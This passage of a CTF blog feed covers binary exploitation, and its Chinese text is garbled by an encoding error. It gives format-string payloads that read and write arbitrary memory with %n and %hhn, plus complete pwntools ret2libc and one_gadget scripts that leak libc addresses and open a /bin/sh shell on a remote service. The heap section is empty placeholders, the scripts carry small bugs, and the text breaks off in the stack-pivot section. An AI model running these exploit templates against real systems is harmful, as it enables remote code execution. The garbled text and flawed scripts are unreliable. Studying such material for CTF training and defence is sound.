    <content type="html"><![CDATA[<p>â€‹    </p><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°å¯ä»¥æ¥å—å¯å˜æ•°é‡çš„å‚æ•°ï¼Œå¹¶<strong>å°†ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ ¹æ®å…¶æ¥è§£æä¹‹åçš„å‚æ•°</strong>ã€‚</p><p>â€‹    </p><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²</h2><p>åŸºæœ¬æ ¼å¼ï¼š<code>%[parameter][flags][field width][.precision][length]type</code></p><p>å‚æ•°ï¼ˆparameterï¼‰</p><ul><li><code>n$</code>ï¼šè·å–æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„æŒ‡å®šå‚æ•°</li></ul><p>é•¿åº¦ï¼ˆlengthï¼‰</p><ul><li><code>hh</code>ï¼šè¾“å‡ºä¸€ä¸ªå­—èŠ‚</li><li><code>h</code>ï¼šè¾“å‡ºä¸€ä¸ªåŒå­—èŠ‚</li></ul><p>ç±»å‹ï¼ˆtypeï¼‰</p><ul><li><code>d/i</code>ï¼šæœ‰ç¬¦å·æ•´æ•°</li><li><code>u</code>ï¼šæ— ç¬¦å·æ•´æ•°</li><li><code>x/X</code>ï¼š16è¿›åˆ¶æ— ç¬¦å·æ•´æ•°</li><li><code>o</code>ï¼š8è¿›åˆ¶æ— ç¬¦å·æ•´æ•°</li><li><code>n</code>ï¼šä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠ<strong>å·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡</strong>ã€‚</li></ul><p>â€‹    </p><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><h3 id="æ³„éœ²å†…å­˜"><a href="#æ³„éœ²å†…å­˜" class="headerlink" title="æ³„éœ²å†…å­˜"></a>æ³„éœ²å†…å­˜</h3><p><code>%X$p</code>ï¼šæ³„éœ²æ ˆä¸Šç¬¬Xä¸ªä½ç½®çš„å€¼ï¼ˆXä¸ºä»»æ„æ­£æ•´æ•°ï¼‰</p><p><code>addr%X$p</code>ï¼šæ³„éœ²ä»»æ„åœ°å€çš„æ•°æ®ï¼ˆ<code>addr</code>ä¸ºè¦æ³„éœ²çš„åœ°å€ï¼‰</p><p>â€‹    </p><h3 id="è¦†ç›–å†…å­˜"><a href="#è¦†ç›–å†…å­˜" class="headerlink" title="è¦†ç›–å†…å­˜"></a>è¦†ç›–å†…å­˜</h3><p><code>%Yc%X$n</code>ï¼šå°†Yå†™å…¥æ ˆä¸Šç¬¬Xä¸ªä½ç½®æŒ‡é’ˆæŒ‡å‘çš„ä½ç½®ï¼ˆYä¸ºè¦å†™å…¥çš„æ•°æ®ï¼ŒXä¸ºä»»æ„æ­£æ•´æ•°ï¼‰</p><p><code>addr%(Y-4)c%X$n</code>ï¼šå‘ä»»æ„åœ°å€å†™ï¼ˆ<code>addr</code>ä¸ºè¦å†™å…¥çš„åœ°å€ï¼‰</p><h4 id="æ ˆåœ°å€è¦†ç›–"><a href="#æ ˆåœ°å€è¦†ç›–" class="headerlink" title="æ ˆåœ°å€è¦†ç›–"></a>æ ˆåœ°å€è¦†ç›–</h4><p>ä¾‹ï¼šæŠŠcçš„å€¼ä»789æ”¹å†™ä¸º16ã€‚</p><p><code>c_addr</code> å 4ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥é¢å¤–åŠ ä¸Š12ä¸ªå­—èŠ‚ï¼Œæœ€ç»ˆå‘ <code>c_addr</code> æŒ‡å‘çš„ç©ºé—´èµ‹å€¼16ï¼š</p><p><code>payload = p32(c_addr) + b&#39;%12c&#39; + b&#39;%6$n&#39;</code></p><h4 id="å°æ•°è¦†ç›–"><a href="#å°æ•°è¦†ç›–" class="headerlink" title="å°æ•°è¦†ç›–"></a>å°æ•°è¦†ç›–</h4><p>ä¾‹ï¼šæŠŠaçš„å€¼æ”¹å†™ä¸º2ã€‚</p><p>å¦‚æœè¿˜ç”¨ä¹‹å‰çš„æ–¹å¼ï¼Œå†™å…¥çš„åœ°å€æœ€å°‘è¦å 4ä½ï¼Œå› æ­¤æœ€å°åªèƒ½èµ‹å€¼4ï¼Œå°è¯•æŠŠåœ°å€æ”¾åˆ°åé¢çš„ä½ç½®ã€‚</p><p>èµ‹å€¼2ï¼Œè¦å†™ä½œ<code>aa%X$n</code>, æŠŠ2èµ‹å€¼ç»™ç¬¬Xä¸ªä½ç½®æŒ‡é’ˆæŒ‡å‘çš„ä½ç½®ã€‚è¿™ä¸ªå­—ç¬¦ä¸²é•¿åº¦ä¸º6ï¼Œä¸æ˜¯4çš„å€æ•°ï¼Œæ‰€ä»¥è¿˜è¦è¡¥å…¨ä¸¤ä¸ªå­—ç¬¦ï¼Œå†åŠ ä¸Šaçš„åœ°å€ã€‚è¿™æ ·æœ€ç»ˆaæ˜¯è½åœ¨äº†æ ˆä¸Šç¬¬8ä¸ªä½ç½®ï¼š</p><p><code>payload = b&#39;aa%8$nbb&#39; + p32(a_addr)</code></p><h4 id="å¤§æ•°è¦†ç›–"><a href="#å¤§æ•°è¦†ç›–" class="headerlink" title="å¤§æ•°è¦†ç›–"></a>å¤§æ•°è¦†ç›–</h4><p>ä¾‹ï¼šæŠŠbçš„å€¼æ”¹å†™ä¸º0x12345678ã€‚</p><p>éœ€è¦èµ‹å€¼ä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œè¿™æ—¶å€™ç›´æ¥å‘æ ˆä¸­å†™å…¥è¿™ä¹ˆå¤šçš„æ•°æ®è‚¯å®šä¸å¤ªæ–¹ä¾¿ã€‚åˆ©ç”¨ <code>hh</code>ï¼ˆå•å­—èŠ‚ï¼‰ å’Œ <code>h</code>ï¼ˆåŒå­—èŠ‚ï¼‰ å‚æ•°é€å­—èŠ‚å†™å…¥ã€‚</p><p>ä»¥å•å­—èŠ‚çš„æ–¹å¼å†™å…¥ï¼Œè‹¥bçš„åœ°å€æ˜¯ <code>0x0804c028</code>ï¼Œé€å­—èŠ‚å†™å…¥åçš„æ•°æ®åˆ†é…åº”è¯¥å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x0804c028 \x78</span><br><span class="line">0x0804c029\x56</span><br><span class="line">0x0804c02a\x34</span><br><span class="line">0x0804c02b\x12</span><br></pre></td></tr></table></figure><p>å› æ­¤éšç€æ„é€ payloadï¼Œå­—ç¬¦ä¸²é•¿åº¦æ˜¯é€æ¸å¢é•¿çš„ï¼Œå› æ­¤è¦æŒ‰ç…§ä»å°åˆ°å¤§çš„é¡ºåºå¡«å……å­—èŠ‚ï¼Œè¿™é‡Œè¦ä»é«˜ä½å‘åœ°ä½å¡«å……ï¼š</p><p><code>payload = p32(0x0804c02b) + b&#39;a&#39;*(0x12 - 4) + b&#39;%6$hhn&#39;</code> ï¼ˆå½“å‰æ€»é•¿åº¦=24ï¼Œå­—ç¬¦é•¿åº¦0x12ï¼‰</p><p>ä¸‹é¢å¡«å……æ¬¡é«˜ä½ã€‚å¡«å……åé¢çš„æ—¶å€™è¦æ³¨æ„ï¼Œå› ä¸ºè¿™æ˜¯ä¸€æ¬¡å‘é€çš„payloadï¼Œå› æ­¤å¡«å……åé¢çš„æ—¶å€™ï¼Œå‰é¢çš„å­—ç¬¦ä¸²é•¿åº¦ä¹Ÿè¦ç®—ä¸Šï¼Œå‰é¢çš„å­—ç¬¦ä¸²é•¿åº¦å·²ç»æœ‰24ä¸ªå­—èŠ‚ï¼Œå› æ­¤æ¬¡é«˜ä½çš„åœ°å€ä¼šå†™å…¥ç¬¬25-28ä¸ªå­—èŠ‚ï¼Œè¿™æ ·å¯¹åº”çš„å°±æ˜¯æ ˆä¸­çš„ç¬¬12ä¸ªä½ç½®ï¼ˆ24/4 + 6ï¼‰ã€‚</p><p>æ„é€ æ¬¡é«˜ä½çš„å­—ç¬¦ä¸²æ—¶è¦æ³¨æ„<strong>ä¸èƒ½åŒ…æ‹¬ <code>%6$hhn</code> çš„é•¿åº¦</strong>ï¼Œå› æ­¤æ¥ä¸‹æ¥è¿˜è¦å¡«å……çš„å­—ç¬¦ä¸²ä¸ªæ•°æ˜¯ <code>æ¬¡é«˜å­—èŠ‚éœ€è¦çš„æ€»å­—èŠ‚æ•° - å¡«å……ä¸Šä¸€å­—èŠ‚å·²ç»æ„é€ çš„å­—èŠ‚æ•° - æ¬¡é«˜å­—èŠ‚åœ°å€ä½æ•°</code>ã€‚æ¬¡é«˜åœ°å€è¿™é‡Œåç»­è¿˜æœ‰payloadè¦å¡«å……ï¼Œç”±äºè¦åœ°å€å¯¹é½ï¼Œå› æ­¤æ·»åŠ ä¸‰ä¸ª<code>b</code>ï¼Œä½¿å¾—æ€»é•¿åº¦ä¸º4çš„å€æ•°ï¼š</p><p><code>payload += p32(0x0804c02a) + b&#39;a&#39;*(0x34 - 0x12 - 4) + b&#39;%12$hhn&#39; + b&#39;bbb&#39;</code> ï¼ˆå½“å‰æ€»é•¿åº¦=68ï¼‰</p><p>æ¥ä¸‹æ¥å¡«å……æ¬¡ä½ä½ã€‚æ„é€ æ–¹æ³•å’Œä¸Šé¢ç±»ä¼¼ï¼Œä¸è¿‡æ·»åŠ å­—ç¬¦çš„æ—¶å€™è¦è®°å¾—æŠŠ <code>bbb</code> è¿™ä¸‰ä¸ªå¯¹é½å­—èŠ‚çš„é•¿åº¦å‡å»ï¼š</p><p><code>payload += p32(0x0804c029) + b&#39;a&#39;*(0x56 - 0x34 - 4 - 3) + b&#39;%23$hhn&#39; + b&#39;bb&#39;</code> ï¼ˆå½“å‰æ€»é•¿åº¦=108ï¼‰</p><p>æœ€åå¡«å……ä½ä½ï¼š</p><p><code>payload += p32(0x0804c028) + b&#39;a&#39;*(0x78- 0x56 - 4 - 2) + b&#39;%33$hhn&#39;</code></p><h4 id="pwntoolså·¥å…·"><a href="#pwntoolså·¥å…·" class="headerlink" title="pwntoolså·¥å…·"></a>pwntoolså·¥å…·</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;)</span><br><span class="line"></span><br><span class="line">offset (int): å­—ç¬¦ä¸²çš„åç§»ï¼Œä»1å¼€å§‹</span><br><span class="line">writes (dict): æ³¨å…¥çš„åœ°å€å’Œå€¼ï¼Œ&#123;target_addr:change_to&#125;</span><br><span class="line">numbwritten (int) : å·²ç»ç”±printfå‡½æ•°å†™å…¥çš„å­—èŠ‚æ•°ï¼Œé»˜è®¤ä¸º0</span><br><span class="line">write_size : é€byte/short/intå†™å…¥ï¼Œé»˜è®¤æ˜¯byte</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°å¯ä»¥æ¥å—å¯å˜æ•°é‡çš„å‚æ•°ï¼Œå¹¶&lt;strong&gt;å°†ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ ¹æ®å…¶æ¥è§£æä¹‹åçš„å‚æ•°&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;â€‹    &lt;/p&gt;
&lt;h2 id=&quot;æ ¼å¼åŒ–å­—ç¬¦ä¸²&quot;&gt;&lt;a href=&quot;#æ ¼å¼åŒ–å­—ç¬¦ä¸²&quot; class=&quot;</summary>
      
    
    
    
    <category term="pwn" scheme="https://lazzzaro.github.io/categories/pwn/"/>
    
    
    <category term="æ ¼å¼åŒ–å­—ç¬¦ä¸²" scheme="https://lazzzaro.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>å †</title>
    <link href="https://lazzzaro.github.io/2021/08/08/pwn-%E5%A0%86/"/>
    <id>https://lazzzaro.github.io/2021/08/08/pwn-%E5%A0%86/</id>
    <published>2021-08-08T09:59:44.000Z</published>
    <updated>2022-08-08T15:20:56.155Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>å †</p><p>â€‹    </p><h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h2 id="binæ”»å‡»"><a href="#binæ”»å‡»" class="headerlink" title="binæ”»å‡»"></a>binæ”»å‡»</h2><h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h3 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h3><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h3 id="tcache-attack"><a href="#tcache-attack" class="headerlink" title="tcache attack"></a>tcache attack</h3><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h2 id="off-byæ”»å‡»"><a href="#off-byæ”»å‡»" class="headerlink" title="off byæ”»å‡»"></a>off byæ”»å‡»</h2><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h3><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h3><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h2 id="house-ofç³»åˆ—"><a href="#house-ofç³»åˆ—" class="headerlink" title="house ofç³»åˆ—"></a>house ofç³»åˆ—</h2><h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h3><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h3><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h3 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h3><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h3 id="house-of-roman"><a href="#house-of-roman" class="headerlink" title="house of roman"></a>house of roman</h3><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h3 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h3><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h3 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h3><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h3 id="house-of-rabbit"><a href="#house-of-rabbit" class="headerlink" title="house of rabbit"></a>house of rabbit</h3><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h3 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h3><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h3 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h3><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;å †&lt;/p&gt;
&lt;p&gt;â€‹    &lt;/p&gt;
&lt;h2 id=&quot;UAF&quot;&gt;&lt;a href=&quot;#UAF&quot; class=&quot;headerlink&quot; title=&quot;UAF&quot;&gt;&lt;/a&gt;UAF&lt;/h2&gt;&lt;p&gt;ï¼ˆé¢„ç•™ï¼‰&lt;/p&gt;
&lt;p&gt;â€‹    &lt;/p&gt;
&lt;h2 id=&quot;b</summary>
      
    
    
    
    <category term="pwn" scheme="https://lazzzaro.github.io/categories/pwn/"/>
    
    
    <category term="å †" scheme="https://lazzzaro.github.io/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>æ ˆ</title>
    <link href="https://lazzzaro.github.io/2021/08/08/pwn-%E6%A0%88/"/>
    <id>https://lazzzaro.github.io/2021/08/08/pwn-%E6%A0%88/</id>
    <published>2021-08-08T09:59:35.000Z</published>
    <updated>2022-10-16T13:03:56.243Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>ROPï¼ˆReturn-Oriented Programming, è¿”å›å¯¼å‘ç¼–ç¨‹ï¼‰</p><p>é€šè¿‡æ ˆæº¢å‡ºçš„æ¼æ´ï¼Œè¦†ç›–return addressï¼Œä»è€Œè¾¾è®©ç›´è¡Œç¨‹åºåå¤æ¨ªè·³çš„ä¸€ç§æŠ€æœ¯ã€‚</p><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p><strong>shellcodeæ•°æ®åº“</strong>ï¼š</p><p><a href="http://www.shell-storm.org/shellcode/">Shellcodes database for study cases</a></p><p>å¸¸ç”¨shellcodeï¼š</p><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>libcæ•°æ®åº“ï¼š</p><p><a href="https://libc.blukat.me/">https://libc.blukat.me/</a></p><p><a href="https://libc.rip/">https://libc.rip/</a></p><p><a href="https://libc.nullbyte.cat/">https://libc.nullbyte.cat/</a></p><p><a href="https://github.com/matrix1001/glibc-all-in-one"><strong>glibc-all-in-one</strong></a></p><h4 id="æ¿å­"><a href="#æ¿å­" class="headerlink" title="æ¿å­"></a>æ¿å­</h4><p>æŸ¥gadgetï¼š</p><p><code>ROPgadget --binary pwn --only &quot;pop|ret&quot;</code></p><ul><li><p><strong>ç»™å®šlibc</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># x64</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;x.x.x.x&#x27;</span>, <span class="number">22222</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt.write</span><br><span class="line">write_got = elf.got.write</span><br><span class="line">main_addr = elf.sym.main</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401233</span></span><br><span class="line">pop_rsi = <span class="number">0x401231</span></span><br><span class="line"></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(main_addr)</span><br><span class="line">p.sendline(pl)</span><br><span class="line">write_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># æˆ– write_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc_base = write_addr-libc.sym.write</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base+libc.sym.system</span><br><span class="line">binsh_addr = libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.sendline(pl)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li><li><p><strong>ä½¿ç”¨LibSearcher</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># x64</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;x.x.x.x&#x27;</span>, <span class="number">22222</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">main_addr = elf.sym.main</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># æˆ– puts_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(libcbase)</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span> + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></li><li><p><strong>one_gadget</strong></p><p>æŸ¥æ‰¾å·²çŸ¥çš„libcä¸­ <code>exevce(&quot;/bin/sh&quot;)</code> è¯­å¥çš„åœ°å€ï¼š</p><p><code>one_gadget libc.so</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># x64</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;x.x.x.x&#x27;</span>, <span class="number">22222</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">main_addr = elf.sym.main</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym.puts</span><br><span class="line"></span><br><span class="line"><span class="comment">#one_gadget libc.so</span></span><br><span class="line">execve_addr = libc_base + <span class="number">0x10a38c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span> + p64(execve_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></li></ul><p>â€‹    </p><h3 id="ret2dl-resolve"><a href="#ret2dl-resolve" class="headerlink" title="ret2dl_resolve"></a>ret2dl_resolve</h3><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h3 id="å…¶ä»–å§¿åŠ¿"><a href="#å…¶ä»–å§¿åŠ¿" class="headerlink" title="å…¶ä»–å§¿åŠ¿"></a>å…¶ä»–å§¿åŠ¿</h3><h4 id="æ ˆè¿ç§»"><a href="#æ ˆè¿ç§»" class="headerlink" title="æ ˆè¿ç§»"></a>æ ˆè¿ç§»</h4><p>åœ¨ä¸€èˆ¬çš„æ ˆæº¢å‡ºæ”»å‡»æ—¶ï¼Œæœ‰ä¸€ä¸ªå‰ææ¡ä»¶æ˜¯â€œæœ‰å……åˆ†çš„æ ˆç©ºé—´ç”¨æ¥å¸ƒå±€â€ï¼Œé€šå¸¸æˆ‘ä»¬ä¼šåœ¨æ ˆçš„å‰©ä½™ç©ºé—´ä¸Šå­˜æ”¾ä¸€äº›æ¶æ„æŒ‡ä»¤ã€‚ä½†æ˜¯å½“æ ˆçš„å‰©ä½™ç©ºé—´å¾ˆå°æ—¶ï¼Œä¾‹å¦‚åªå¯è¦†ç›–ebpå’Œretï¼Œä¸€èˆ¬çš„æ ˆæº¢å‡ºæ€è·¯å°±æ— æ³•å®Œæˆæ”»å‡»ã€‚</p><p>ä¸è¿‡æ—¢ç„¶æ ˆä¸Šæ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—´ä¾›æˆ‘ä»¬å¸ƒç½®ï¼Œé‚£æˆ‘ä»¬å¯ä»¥å°è¯•æ‰¾å¦ä¸€å—ç©ºé—´æ¥è¿›è¡Œå¸ƒå±€ï¼Œç„¶åå°†æ ˆæŒ‡é’ˆespåŠ«æŒåˆ°è¿™é‡Œå°±èƒ½å®Œæˆæ”»å‡»ï¼Œè¿™å°±æ˜¯â€æ ˆè¿ç§»â€œçš„åŸºæœ¬æ€æƒ³ã€‚</p><p><img src="/2021/08/08/pwn-%E6%A0%88/post-51-6267746ca6e62.png" alt="image-20220412203701158.png" style="zoom: 80%;"></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œå½“ä¸»è°ƒå‡½æ•°è°ƒç”¨<code>func</code>å‡½æ•°æ—¶ï¼š</p><ul><li>æ‰§è¡Œ<code>push 